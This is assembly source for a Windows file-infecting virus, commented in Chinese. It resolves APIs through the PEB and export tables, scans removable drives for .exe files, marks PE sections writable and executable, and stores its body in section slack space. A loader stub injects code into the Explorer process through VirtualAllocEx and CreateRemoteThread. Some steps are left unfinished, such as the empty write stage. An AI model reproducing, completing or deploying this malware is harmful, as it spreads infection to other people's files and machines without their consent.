	.386
	.model flat,stdcall
	option casemap:none
	
	include chong.inc
	include windows.inc
	;there is no import...
	
MyExitProcess      	PROTO :DWORD
MyLoadLibrary		PROTO :DWORD
MyMessageBox       	PROTO :DWORD,:DWORD,:DWORD,:DWORD
MyGetLogicalDrives	PROTO
MySetTimer		PROTO :DWORD,:DWORD,:DWORD,:DWORD
MySleep			PROTO :DWORD
MyCreateThread		PROTO :DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD
MyGetDriveType		PROTO :DWORD
MyFindFirstFile		PROTO :DWORD,:DWORD
MyFindNextFile		PROTO :DWORD,:DWORD
MyCreateFile		PROTO :DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD
MyCreateFileMapping	PROTO :DWORD,:DWORD,:DWORD,:DWORD,:DWORD,:DWORD
MyMapViewOfFile		PROTO :DWORD,:DWORD,:DWORD,:DWORD,:DWORD
MyUnmapViewOfFile	PROTO :DWORD
MyCloseHandle		PROTO :DWORD



	.code
APPEND_CODE_START	EQU this byte

option prologue:none
SomeData	proc
	VirusSize	dd	?
	
	kbase		dd	?
	userbase	dd	?
		
	_ExitProcess           	dd  	?
	_LoadLibrary		dd	?
	_GetLogicalDrives	dd	?
	_Sleep			dd	?
	_CreateThread		dd	?
	_GetDriveType		dd	?
	_FindFirstFile		dd	?
	_FindNextFile		dd	?
	_CreateFile		dd	?
	_CreateFileMapping	dd	?
	_MapViewOfFile		dd	?
	_UnmapViewOfFile	dd	?
	_CloseHandle		dd	?
				dd	0
		
	
	_MessageBoxA		dd	?
	_SetTimer		dd	?
				dd	0
	
	szUserdll		db 'user32.dll',0
	;kernel
	szExitProcess          	db 'ExitProcess',0
	szLoadLibrary		db 'LoadLibraryA',0
	szGetLogicalDrives	db 'GetLogicalDrives',0
	szSleep			db 'Sleep',0
	szCreateThread		db 'CreateThread',0
	szGetDriveType		db 'GetDriveTypeA',0
	szFindFirstFile		db 'FindFirstFileA',0
	szFindNextFile		db 'FindNextFileA',0
	szCreateFile		db 'CreateFileA',0
	szCreateFileMapping	db 'CreateFileMappingA',0
	szMapViewOfFile		db 'MapViewOfFile',0
	szUnmapViewOfFile	db 'UnmapViewOfFile',0
	szCloseHandle		db 'CloseHandle',0
	;user32
	szMessageBoxA		db 'MessageBoxA',0
	szSetTimer		db 'SetTimer',0
	;=================================================
	szDriver		db 'C:\',0
				db MAX_PATH dup (0)
	szUdriver	 	db "U:\*.exe",0	;感染u盘下的所有exe文件
	;=================================================
        EVEN ;???????????????                      
        ;API 函数名引用表
        OffExitProcess         	dd  	offset 	szExitProcess
	OffLoadLibrary		dd	offset	szLoadLibrary
	OffGetLogicalDrives	dd	offset  szGetLogicalDrives
	OffSleep		dd	offset	szSleep
	OffCreateThread		dd	offset	szCreateThread
	OffGetDriveType		dd	offset  szGetDriveType
	OffFindFirstFile	dd	offset  szFindFirstFile
	OffFindNextFile		dd	offset  szFindNextFile
	OffCreateFile		dd	offset  szCreateFile
	OffCreateFileMapping	dd	offset  szCreateFileMapping
	OffMapViewOfFile	dd	offset  szMapViewOfFile
	OffUnmapViewOfFile	dd	offset  szUnmapViewOfFile
	OffCloseHandle		dd	offset  szCloseHandle
                               	dd  	0
	OffMessageBoxA         	dd  	offset 	szMessageBoxA
	OffSetTimer		dd	offset 	szSetTimer
                               	dd  	0			;作为分界点
SomeData 	endp
MyExitProcess       	proc uExitCode:DWORD
        jmp     _ExitProcess   ; ExitProcess(x)
MyExitProcess       	endp
MyLoadLibrary		proc	lpLibFileName:DWORD
	jmp	_LoadLibrary
MyLoadLibrary 		endp
MyMessageBox        proc hWnd1:DWORD,lpText:DWORD,lpCaption:DWORD,uType:DWORD
                jmp     _MessageBoxA    ; MessageBoxA(x,x,x,x)
MyMessageBox        endp
MyGetLogicalDrives	proc
	jmp	_GetLogicalDrives
MyGetLogicalDrives endp
MySetTimer	proc	hwnd,idevent,ueclapse,lpfunc
	jmp	_SetTimer
MySetTimer endp
MySleep	proc dwmiliscd
	jmp 	_Sleep
MySleep	endp
MyCreateThread	proc lpsa,cbStack,lpStartAddr, lpvThreadParam, fdwCreate, lpIDThread
	jmp	_CreateThread
MyCreateThread endp
MyGetDriveType	proc lpRootPathName
	jmp 	_GetDriveType	
MyGetDriveType	endp
MyFindFirstFile proc lpFileName,lpFindFileData 
	jmp	_FindFirstFile
MyFindFirstFile endp
MyFindNextFile	proc hFindFile, lpFindFileData 
	jmp	_FindNextFile
MyFindNextFile endp
MyCreateFile	proc lpFileName, dwDesiredAccess, dwShareMode,lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile
	jmp	_CreateFile
MyCreateFile endp
MyCreateFileMapping proc hFile,lpFileMappingAttributes,flProtect, dwMaximumSizeHigh, dwMaximumSizeLow, lpName 
	jmp	_CreateFileMapping
MyCreateFileMapping endp
MyMapViewOfFile proc hFileMappingObject, dwDesiredAccess, dwFileOffsetHigh, dwFileOffsetLow, dwNumberOfBytesToMap 
	jmp	_MapViewOfFile
MyMapViewOfFile endp
MyUnmapViewOfFile proc lpBaseAddress 
	jmp	_UnmapViewOfFile
MyUnmapViewOfFile endp
MyCloseHandle proc hObject
	jmp	_CloseHandle
MyCloseHandle endp
option prologue:PrologueDef
;=====================================================================================
;自定义函数:比较ansi字符串和unicode字符串    	 
;=====================================================================================
_ComparAnsiStrUnicodeStr proc uses  esi edi lpAnsiStr:DWORD, lpUnicodeStr:DWORD
    mov esi, lpAnsiStr
    mov edi, lpUnicodeStr
@@:
    lodsb
    .if	al=='.'	;2E
    	ret
    .endif
    .if	al!=byte ptr [edi]
    	xor	eax,eax
    	ret
    .endif
    inc	edi
    inc	edi
    jmp	@B	
_ComparAnsiStrUnicodeStr endp
GetKnlBase	proc
	string 	szknlname,"kernel32.dll"
	db	64h
	mov	eax,ds:30h
	mov 	eax,[eax+0CH]
	mov 	edi,[eax+1CH]	;edi points to the listnode
  @@:
	mov	esi,[edi].LDR_MODULE_NODE.pName
	invoke _ComparAnsiStrUnicodeStr,offset szknlname,esi
	.if	eax!=0	;we got it
		mov	eax,[edi].LDR_MODULE_NODE.Base
		ret
	.endif
	mov	edi,[edi].LDR_MODULE_NODE.Next
	jmp	@B
	
	ret
GetKnlBase endp
;=====================================================================================
;自定义函数:获取函数的地址,参数BaseAddress为dll基址, lpProcName为要查找的函数名称地址
;采用二分查找,原理:dll的输出函数名按字母顺序排列
;=====================================================================================
GetFunctionAddress proc uses ecx ebx esi edi BaseAddress:DWORD, lpProcName:DWORD
	LOCAL Count                 :DWORD
	LOCAL NumberOfNames         :DWORD
	LOCAL AddressOfNames        :DWORD
	LOCAL AddressOfNameOrdinals :DWORD
	LOCAL AddressOfFunctions    :DWORD
	LOCAL ExportSize            :DWORD 
	LOCAL ProcAddr              :DWORD
	LOCAL ExportAddr            :DWORD

	mov ebx, BaseAddress
	movzx eax, word ptr [ebx].IMAGE_DOS_HEADER.e_lfanew
	add ebx, eax

    mov eax, [ebx].IMAGE_NT_HEADERS1.OptionalHeader.DirectoryExport.isize
    mov ExportSize, eax
    
	mov ebx, [ebx].IMAGE_NT_HEADERS1.OptionalHeader.DirectoryExport.VirtualAddress
	add ebx, BaseAddress
	mov ExportAddr, ebx

	mov eax, [ebx].IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals
	add eax, BaseAddress

	mov  AddressOfNameOrdinals, eax
	mov eax, [ebx].IMAGE_EXPORT_DIRECTORY.NumberOfNames
	mov NumberOfNames, eax

	mov eax, [ebx].IMAGE_EXPORT_DIRECTORY.AddressOfNames
	add eax, BaseAddress
	mov  AddressOfNames, eax

	mov eax, [ebx].IMAGE_EXPORT_DIRECTORY.AddressOfFunctions
	add eax, BaseAddress
	mov AddressOfFunctions, eax

	mov eax, NumberOfNames
	and Count, 0
	lea ecx, [eax-1]              ; ecx = NumberOfNames - 1
	test ecx, ecx
	jl CheckEnd

Loop1:
	mov eax, Count
	mov edi, lpProcName
	lea esi, [eax+ecx]            ; ecx = NumberOfName - 1
																; esi = Count + ecx
	mov eax, AddressOfNames       ; eax = AddressOfNamesBase
	sar esi, 1                    ; esi / 2

	mov eax, [eax+esi*4]          ; 在AddressOfNames偏移地址表中取函数名的偏移量
	add eax, BaseAddress          ; 加上基地址得到函数名的地址

Loop_If_dl_IsNotTerminalChar:     ; 从函数名中取一个字符
	mov bl, [edi]
	mov dl, bl
	cmp bl, [eax]                 ; 和函数名列表中的函数名在相应的位置上进行比较，特别
								  ; 需要注意，当两个字符进行比较时：
								  ;  if bl >= [eax]
								  ;     CF = 0          //这里将CF标志位置 0
								  ;  else               //bl < [eax]
								  ;     CF = 1
								  ;  end
								  ; 这里将 CF(进位标志) 置位，根据函数名排序的条件，即
								  ; 决定了是向前搜索，还是向后搜索：
								  ;   jnz short IfCharNotEqu
								  ; 不影响标志位，这个标志位将在后面的代码中使用
	jnz IfCharNoEqu
	test dl, dl
	jz If_dl_IsTerminalChar
	mov bl, [edi+1]               ; 取下一个字符
	mov dl, bl
	cmp bl, [eax+1]               ; 和下一个函数名字符进行比较，这里和上面的比较相同，
								  ; 通过设置 CF 标志位来决定搜索的方向。
	jnz  IfCharNoEqu
	inc edi                       ; 调整指针，指向下二个字符
	inc edi
	inc eax
	inc eax
	test dl, dl
	jnz Loop_If_dl_IsNotTerminalChar

If_dl_IsTerminalChar:
	xor eax, eax
	jmp CheckDirection

IfCharNoEqu:                      ; 指令
	sbb eax, eax                  ;   sbb eax, eax    //带进位减
								  ; 其结果只有两种可能
								  ;   if CF == 0
								  ;      eax = 0
								  ;      set CF = 0
								  ;   else        //CF = 1
								  ;      eax = 0xFFFFFFFF
								  ;      set CF = 1
								  ;   end;
	sbb eax, 0FFFFFFFFh           ; 指令
								  ;   sbb eax, 0FFFFFFFFh    //带进位减
								  ; 其结果也是两种可能
								  ;   if  CF == 0
								  ;      eax = 0
								  ;      set SF = 0
								  ;   else         //CF = 1
								  ;      eax = 0xFFFFFFFF
								  ;      set SF = 1
								  ;   end
								  ; 这里 SF 是符号标志位，即判断结果是正数还是负数。
CheckDirection:                     ; 指令
	test eax, eax                 ;   test eax, eax
								  ; 一般我们用来测试某一位是 1 还是 0，但这个操作同样影
								  ; 响符号标志位：
								  ;   if eax >= 0
								  ;     set SF = 0
								  ;   else
								  ;     set SF = 1
								  ;   end
	jge ForewardSearch            ; Jump if Greater or Equal (SF=0)

BackwardSearch:                   ; 
	lea ecx, [esi-1]
	jmp NextSearch

ForewardSearch:
	jle SearchEnd
	lea eax, [esi+1]
	mov Count, eax

NextSearch:
	cmp ecx, Count
	jge Loop1
	jmp SearchEnd

CheckEnd:
	mov esi, NumberOfNames

SearchEnd:
	cmp ecx, Count
	jge GetOrdinal
	or ax, 0FFFFh
	jmp Exit

GetOrdinal:
    mov eax, AddressOfNameOrdinals
    mov ax, [eax+esi*2]
	movzx ecx, word ptr ax      ; 序号列表的单位是 WORD 所以 esi*2 即得到序号的偏移
							    ; 地址，加上基地址，即得到函数的序号。
	mov eax, AddressOfFunctions ; 函数地址表起始地址
	lea eax, [eax+ecx*4]        ; 加上序号乘4，因为函数地址表的单位是 DWORD
	mov ecx, [eax]              ; 取函数地址的偏移量
	add ecx, BaseAddress        ; 加上基地址即函数的调用地址
	mov ProcAddr, ecx
    mov edx, ExportSize
    add edx, ExportAddr
   ;----------------------------------------------------------------------------------
   ;屏蔽此段,暂不需要
    ; 如果返回的函数调用地址在 ExportAddr 之间，则这个模块在外部模块
    ;.if ((ecx > ExportAddr) && (ecx <= edx))
     ;   ; 验证是否为有效的字符串
      ;  invoke CheckIsStr, ecx
       ; .if eax 
        ;    ; 如果是，根据模块前部的指引获得该模块的基地址
         ;   invoke GetDllBase, eax
          ;  ; 调用自己，获得函数调用地址
           ; invoke GetFunctionAddress, eax, lpProcName
            ;mov ProcAddr, eax
      ;  .endif
    ;.endif	
    ;----------------------------------------------------------------------------------
	
Exit:
    mov eax, ProcAddr
	ret
GetFunctionAddress endp

InfectExeFile	proc	lpFileName:DWORD,lpBlockTbl:DWORD
LOCAL	hFile
LOCAL   hFileMap
LOCAL	lpMem
LOCAL	TotalSpce

pushad
;======================打开文件并创建文件映像
invoke 	MyCreateFile,lpFileName,GENERIC_WRITE OR GENERIC_READ,FILE_SHARE_WRITE OR FILE_SHARE_READ,NULL,\
				OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL
.if	eax==INVALID_HANDLE_VALUE 
	jmp	@ret1
.endif
mov	hFile,eax
invoke	MyCreateFileMapping,eax,NULL,PAGE_READWRITE,0,0,NULL
.if    	eax==0
	jmp	@ret2
.endif	
mov	hFileMap,eax
invoke	MyMapViewOfFile,eax,FILE_MAP_ALL_ACCESS,0,0,0
.if    	eax==0
	jmp	@ret3
.endif	
mov	lpMem,eax
;======================检查pe文件的有效性
mov	esi,eax
assume	esi:ptr IMAGE_DOS_HEADER
.if	[esi].e_magic!=IMAGE_DOS_SIGNATURE
	jmp	@ret3
.endif
add	esi,[esi].e_lfanew
assume	esi:ptr IMAGE_NT_HEADERS
.if	[esi].Signature!=IMAGE_NT_SIGNATURE
	jmp	@ret3
.endif
;======================检查文件是否已被感染
.if	[esi].OptionalHeader.LoaderFlags==dword ptr 'gniS'
	jmp	@ret3
.endif
;======================检查文件中是否有足够的空间写入病毒体,并设置各个节属性为:可读写,可执行
movzx	ecx,[esi].FileHeader.NumberOfSections
lea	edi,lpBlockTbl
xor	eax,eax
stosd		;每次将分块数清零
mov	TotalSpce,eax	;获取的总空闲空间清零
xor	edx,edx		;edx代表总空闲空间
assume	edi:ptr BLOCK_NODE

push	esi

add	esi,sizeof(IMAGE_NT_HEADERS)
assume	esi:ptr IMAGE_SECTION_HEADER
@@:
mov	ebx,[esi].SizeOfRawData
sub	ebx,[esi].Misc.VirtualSize	;the space in this section
.if	ebx<50h	; so small that we donot have interets with it 
	add	esi,sizeof IMAGE_SECTION_HEADER	;the next section
	loop	@B
.endif
add	edx,ebx
.if	edx>=VirusSize
	jmp	@OK
.else
	sub	edx,5	;空闲空间不足,需要切割代码体,会多出一个跳转指令,预留5个字节大小
	inc	[lpBlockTbl]	;首个双字记录分块数
	mov	eax,[esi].VirtualAddress
	add	eax,[esi].Misc.VirtualSize	;此块病毒体的起始rva
	stosd	;保存本块代码的起始RVA
	mov	eax,ebx	;the space in this section
	sub	eax,5	;减去预留的跳转指令占的5个字节
	stosd	;保存本块代码的大小
.endif
mov	[esi].Characteristics,0E0000020H	;可读写,可执行
add	esi,sizeof IMAGE_SECTION_HEADER	;the next section
loop	@B
;if we got here,there is no enough space for our virus,then return
pop 	esi
jmp	@ret3
;======================空闲空间足够大
@OK:	
pop	esi	

;======================万事OK,开始写入


 @ret3:
 	invoke 	MyUnmapViewOfFile,lpMem
 @ret2:
 	invoke 	MyCloseHandle,hFileMap
 @ret1:
	invoke  MyCloseHandle,hFile
	popad
	ret
InfectExeFile endp
ThreadProc	proc lpParameter:DWORD	;参数接受主线程传递的一个内存缓冲区,用于保存代码体分块信息的---称为分块信息表
LOCAL	hFindFile
LOCAL	FindData:WIN32_FIND_DATA	 	
	.while TRUE
		invoke 	MyGetLogicalDrives	;之所以使用此函数,而不是使用GetLogicalDriveStrings,是为了缩短代码
		mov	ebx,eax
		mov 	dword ptr [szDriver],dword ptr '\:B'
		
		shr	ebx,2
	@@:	
		rcr	ebx,1
		jnc	@NoDrivers
		inc	byte ptr[szDriver]
		invoke	MyGetDriveType,offset szDriver
		.if	eax==DRIVE_REMOVABLE	;传染移动介质
			mov	al,byte ptr[szDriver]
			mov	byte ptr[szUdriver],al
			invoke MyFindFirstFile,offset szUdriver,addr FindData
			.if	eax!=INVALID_HANDLE_VALUE
				mov	hFindFile,eax
				.repeat
					pushad
					lea 	edi,szDriver
					add	edi,3
					lea	esi,FindData.cFileName
				movnext:lodsb
					.if	al!=0
						stosb
						jmp	movnext
					.endif
					stosb
					popad
					invoke InfectExeFile,offset szDriver,lpParameter
					invoke MyFindNextFile,hFindFile,addr FindData
				.until	eax==FALSE
			.endif
			
		.endif
		loop	@B
		invoke	MyMessageBox,NULL,0,0,MB_OK
  @NoDrivers:	
		invoke 	MySleep,1000	
   
	.endw
	ret
ThreadProc endp
GetApis	proc 	;get some module's base and apis needed in my virus...
	pushad
	;============get kernel32.dll's base
	invoke GetKnlBase
	mov	[ebp+kbase],eax
	;============and then get the apis exported by kernel32.dll
	lea	edi,_ExitProcess
	lea	esi,OffExitProcess
	.while (dword ptr [esi] != 0)
        	invoke GetFunctionAddress,kbase,dword ptr[esi]
        	stosd                          ;建立kernel32.dll的输入表
        	lodsd
    	.endw
	;============get user32.dll's base
	invoke	MyLoadLibrary,offset szUserdll
	mov	[ebp+userbase],eax
	;============and then get the apis exported by user32.dll
	lea	edi,_MessageBoxA
	lea	esi,OffMessageBoxA
	.while (dword ptr [esi] != 0)
        	invoke GetFunctionAddress,userbase,dword ptr[esi]
        	stosd                          ;建立user32.dll的输入表
        	lodsd
    	.endw
	popad
	ret
GetApis endp

start:
;================	
	call	@delta
 @delta:
 	pop	ebp
 	sub	ebp,offset @delta	
;================
	;lea	eax,APPEND_CODE_END
	mov	eax,$
	;要是这样的话还要加上后续指令的长度,待完善...
	sub 	eax,offset APPEND_CODE_START
	mov	VirusSize,eax
	invoke	GetApis	
	string  szCap,"NO IMPORT"
	string  szInfo,"Hello,world!"
	invoke	MyMessageBox,NULL,offset szInfo,offset szCap,MB_OK
	
	;invoke MyVirtualAllocate,1KB
	invoke MyCreateThread,NULL,NULL,ThreadProc,eax,NULL,NULL
	.while TRUE
		invoke MySleep,2000
	.endw
	invoke	MyExitProcess,NULL
		
		
APPEND_CODE_END	EQU this byte

;############################################################################################
;这段代码是引导程序,当代码体寄生在宿主时,首先执行此段代码,复制将病毒体完整修复净化后,
;创建远程线程,再执行病毒体.即达到病毒的重生.
;前端是一个病毒的分块表,由病毒分块信息重新装配病毒.
MAIN_CODE_START	EQU THIS BYTE
;================
 	jmp	@F
Tbl	equ this dword
BlockCnts		DD	?	;保存了分块数
			DD  20 dup (?)	;预留10块
ImgBase			dd	00400000H
_OpenProcess		dd	?
_VirtualAllocEx		dd	?
_CreateRemoteThread 	dd	?
	ubase		dd	?
	_loadlibrary	dd	?
_FindWindow		dd	?
_GetWindowThreadProcessId dd	?
@dwProcessId		dd	?
	
			db  '1111111',0
szUserdll2		db 'user32.dll',0
szDesktopCls		db 'Progman',0
szDesktopWnd		db 'Program Manager',0

szOpenProcess		db  'OpenProcess',0
szVirtualAllocEx 	db  'VirtualAllocEx',0
szCreateRemoteThread	db  'CreateRemoteThread',0
szloadlibrary		db  'LoadLibraryA',0
szFindWindow		db  'FindWindow',0
szGetWindowThreadProcessId db 'GetWindowThreadProcessId',0

@@:	
	invoke GetKnlBase
	mov	ebx,eax
	invoke GetFunctionAddress,ebx,offset szOpenProcess
	mov	_OpenProcess,eax
	invoke GetFunctionAddress,ebx,offset szVirtualAllocEx 
	mov	_VirtualAllocEx,eax
	invoke GetFunctionAddress,ebx,offset szCreateRemoteThread
	mov	_CreateRemoteThread,eax
	invoke GetFunctionAddress,ebx,offset szloadlibrary
	mov	_loadlibrary,eax
	push	offset szUserdll2
	call	_loadlibrary
	mov	ebx,eax
	invoke GetFunctionAddress,ebx,offset szFindWindow
	mov	_FindWindow,eax
	invoke GetFunctionAddress,ebx,offset szGetWindowThreadProcessId
	mov	_GetWindowThreadProcessId,eax
	push 	offset szDesktopWnd
	push 	offset szDesktopCls
	call	_FindWindow
	cmp	al,0
	jz	@return
	lea	ebx,@dwProcessId
	push	ebx
	push	eax
	call	_GetWindowThreadProcessId
	push	eax
	push	0
	push	PROCESS_CREATE_THREAD OR PROCESS_VM_WRITE OR PROCESS_VM_OPERATION
	call	_OpenProcess
	mov	ebx,eax		;ebx 保存hProcess
	push	PAGE_EXECUTE_READWRITE
	push	MEM_COMMIT
	push	VirusSize
	push 	0
	push	eax
	call	_VirtualAllocEx
	mov	edi,eax
	mov	ecx,BlockCnts
	lea	esi,[BlockCnts+4]
@GoOn:
	lodsd
	add	eax,ImgBase
	
	mov	edx,eax
	lodsd	
	push	ecx
	mov	ecx,eax
	push	esi
	mov	esi,edx
	rep	movsb
	pop	esi
	pop	ecx
	loop	@GoOn
	;
	;
	;
	call	_CreateRemoteThread
	
@return:
	ret	
;================

MAIN_CODE_END	EQU THIS BYTE
;############################################################################################

end	start